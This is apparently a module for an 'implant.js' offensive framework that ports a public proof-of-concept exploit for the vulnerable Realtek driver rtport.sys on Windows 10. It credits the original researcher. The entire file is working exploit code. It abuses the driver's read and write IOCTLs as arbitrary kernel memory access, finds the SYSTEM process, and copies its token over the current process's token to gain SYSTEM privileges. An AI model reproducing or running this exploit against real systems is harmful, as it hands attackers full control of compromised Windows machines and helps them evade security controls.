// This module is a port of https://github.com/TakahiroHaruyama/VDR/blob/main/PoCs/firmware/eop_rtport.py to the implant.js framework
// Tested on Win10, version 10.0.19045
// Requires the vulnerable driver 'rtport.sys' (SHA256: 71423a66165782efb4db7be6ce48ddb463d9f65fd0f266d333a6558791d158e5) to be active on the system
// All credit for the original exploit research goes to Takahiro Haruyama (@cci_forensics)
// Original research blog: https://blogs.vmware.com/security/2023/10/hunting-vulnerable-kernel-drivers.html

import { hex, free, malloc, rawToBigintArr, rawToString } from "lib/utils.js";

if (ctx.os() !== OS_WINDOWS) {
    throw new Error("not on windows, module won't work!");
}

if (!ctx.system("sc.exe query rtport", true).includes("RUNNING")) {
    throw new Error("rtport.sys not active on the target, can't exploit it");
}

const GetProcAddress = ctx.ffi.resolve("kernel32.dll", "GetProcAddress", TYPE_POINTER, [TYPE_POINTER, TYPE_STRING]);
const LoadLibraryA = ctx.ffi.resolve("kernel32.dll", "LoadLibraryA", TYPE_POINTER, [TYPE_STRING]);
const CreateFileA = ctx.ffi.resolve("kernel32.dll", "CreateFileA", TYPE_POINTER, [TYPE_STRING, TYPE_INTEGER, TYPE_INTEGER, TYPE_POINTER, TYPE_INTEGER, TYPE_INTEGER, TYPE_POINTER]);
const DeviceIoControl = ctx.ffi.resolve("kernel32.dll", "DeviceIoControl", TYPE_BOOL, [TYPE_POINTER, TYPE_INTEGER, TYPE_POINTER, TYPE_INTEGER, TYPE_POINTER, TYPE_INTEGER, TYPE_POINTER, TYPE_POINTER]);
const EnumDeviceDrivers = ctx.ffi.resolve("psapi.dll", "EnumDeviceDrivers", TYPE_BOOL, [TYPE_POINTER, TYPE_INTEGER, TYPE_POINTER]);
const GetDeviceDriverBaseNameA = ctx.ffi.resolve("psapi.dll", "GetDeviceDriverBaseNameA", TYPE_INTEGER, [TYPE_POINTER, TYPE_POINTER, TYPE_INTEGER]);

const GetCurrentProcessId = ctx.ffi.resolve("kernel32.dll", "GetCurrentProcessId", TYPE_INTEGER);

const GENERIC_READ = (1 << 30);
const GENERIC_WRITE = (1 << 31);
const FILE_SHARE_READ = 1;
const FILE_SHARE_WRITE = 2;
const OPEN_EXISTING = 3;
const FILE_ATTRIBUTE_NORMAL = 0x80;

// these are for win11 in the original exploit, but they are the same on my win10 19045 VM
const OFF_PID = 0x440n;
const OFF_APLINKS = 0x448n;
const OFF_TOKEN = 0x4b8n;

const DEV_NAME = "\\\\.\\rtport";
const IOCTL_READ = 0x9c726808;
const IOCTL_WRITE = 0x9c72a848;

const NULL = 0n;

function get_device_handle() {
    return CreateFileA(DEV_NAME, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

function rt_read8(hdev, src) {
    const res = malloc(8);
    const buf = malloc(8);
    const bytes_returned = malloc(8);

    // read the low dword
    ctx.mem.write_qword(buf, BigInt(src));
    DeviceIoControl(hdev, IOCTL_READ, buf, 8, buf, 8, bytes_returned, NULL);
    ctx.mem.copy(res, buf, 4);

    // read the high dword
    ctx.mem.write_qword(buf, BigInt(src) + 4n);
    DeviceIoControl(hdev, IOCTL_READ, buf, 8, buf, 8, bytes_returned, NULL);
    ctx.mem.copy(res + 4n, buf, 4);

    const ret = BigInt.asUintN(64, ctx.mem.read_qword(res));

    free(res);
    free(buf);
    free(bytes_returned);

    return ret;
}

function rt_write8(hdev, dst, value) {
    // first 8 bytes are the address, next 4 are the value
    const buf = malloc(0xc);

    const bytes_returned = malloc(8);

    // write the low dword
    ctx.mem.write_qword(buf, dst)
    ctx.mem.write_qword(buf + 8n, value & 0xffffffffn);
    DeviceIoControl(hdev, IOCTL_WRITE, buf, 0xc, buf, 0xc, bytes_returned, NULL);

    // write the high dword
    ctx.mem.write_qword(buf, dst + 4n)
    ctx.mem.write_qword(buf + 8n, value >> 32n);
    DeviceIoControl(hdev, IOCTL_WRITE, buf, 0xc, buf, 0xc, bytes_returned, NULL);

    free(bytes_returned);
    free(buf);
}

function get_driver_bases() {
    const lpcbNeeded = malloc(4);
    EnumDeviceDrivers(NULL, 0, lpcbNeeded);
    const cbNeeded = ctx.mem.read_dword(lpcbNeeded);
    const num_of_mods = cbNeeded / 8;

    const array = malloc(8 * num_of_mods);
    EnumDeviceDrivers(array, cbNeeded, lpcbNeeded);

    let ptrs = rawToBigintArr(array, num_of_mods);

    let baseAddrs = {}

    for (let i = 0; i < num_of_mods; i++) {
        let namePtr = malloc(260);
        GetDeviceDriverBaseNameA(ptrs[i], namePtr, 260);

        // ctx.output(`${rawToString(namePtr)} base: ${hex(ptrs[i])}`);
        let m = rawToString(namePtr);
        baseAddrs[m] = ptrs[i];

        free(namePtr);
    }

    free(array);
    free(lpcbNeeded);

    return baseAddrs;
}

function find_kernel_base() {
    let mods = get_driver_bases();

    for (const [k, v] of Object.entries(mods)) {
        if (k.includes("krnl") && k.endsWith(".exe")) {
            return [k, v];
        }
    }

    return [null, null];
}

function get_kernel_address(hmodule, realbase, symbol) {
    return GetProcAddress(hmodule, symbol) - hmodule + realbase;
}

function get_current_eprocess(hdev, ep, my_pid) {
    while (true) {
        const flink = rt_read8(hdev, ep + OFF_APLINKS);
        ep = flink - OFF_APLINKS;

        const pid = rt_read8(hdev, ep + OFF_PID);

        if (pid === BigInt(my_pid)) {
            return ep;
        }

        if (pid === 4n) {
            // base case, pid4 == system
            return null;
        }
    }
}

function main() {
    const [kname, kbase] = find_kernel_base();
    if (!kname) {
        throw new Error("couldn't find kernel base");
    }
    ctx.output(`kernel ${kname} base: ${hex(kbase)}`);

    const kbase_in_user = LoadLibraryA(kname);
    const ptr_ep_system = get_kernel_address(kbase_in_user, kbase, "PsInitialSystemProcess");
    ctx.output(`PsInitialSystemProcess @ ${hex(ptr_ep_system)}`);

    const hdev = get_device_handle();
    ctx.output(`rtport.sys handle: ${hex(hdev)}`);

    const ep_system = rt_read8(hdev, ptr_ep_system);
    ctx.output(`system _EPROCESS @ ${hex(ep_system)}`);

    const token_system = rt_read8(hdev, ep_system + OFF_TOKEN);
    ctx.output(`system _TOKEN @ ${hex(token_system)}`);

    const pid = GetCurrentProcessId();
    const ep = get_current_eprocess(hdev, ep_system, pid);
    if (!ep) {
        throw new Error(`failed to find current process (${pid}) in the process list`);
    }
    ctx.output(`pid is ${pid}, _EPROCESS @ ${hex(ep)}`);

    const before = rt_read8(hdev, ep + OFF_TOKEN);
    rt_write8(hdev, ep + OFF_TOKEN, token_system);
    const after = rt_read8(hdev, ep + OFF_TOKEN);
    if (before === after) {
        throw new Error(`overwrite didn't work, still set to ${hex(before)}`);
    }
    ctx.output("successfully overwrote token with system token, check privs");
}

main();